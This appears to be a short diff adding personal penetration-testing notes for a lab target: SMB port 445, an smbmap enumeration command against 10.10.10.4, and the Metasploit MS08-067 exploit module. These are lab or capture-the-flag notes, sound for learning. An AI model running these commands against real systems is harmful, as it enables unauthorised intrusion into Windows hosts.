@@ -1,0 +1,5 @@
+Port 445
+
+smbmap -H 10.10.10.4
+
+use exploit/windows/smb/ms08_067_netapi
